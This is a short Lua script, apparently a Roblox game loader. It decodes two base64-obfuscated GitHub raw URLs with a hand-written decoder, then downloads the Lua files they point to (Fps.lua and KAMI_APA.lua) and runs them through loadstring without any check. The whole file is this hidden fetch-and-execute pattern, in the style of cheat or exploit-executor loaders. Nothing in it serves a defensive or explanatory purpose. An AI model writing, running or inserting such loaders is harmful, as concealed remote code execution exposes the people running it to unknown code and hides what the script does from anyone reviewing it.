local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function d(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do
			r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0')
		end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do
			c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
		end
		return string.char(c)
	end))
end



local u = d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FyeW5uZGEvc2Ficy9tYWluL0Zwcy5sdWE=")
local s = game:HttpGet(u, true)
local f = loadstring(s)
if type(f) == "function" then
	f()
end



local u = d("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FyeW5uZGEvc2Ficy9yZWZzL2hlYWRzL21haW4vS0FNSV9BUEEubHVh")
local s = game:HttpGet(u, true)
local f = loadstring(s)
if type(f) == "function" then
	f()
end
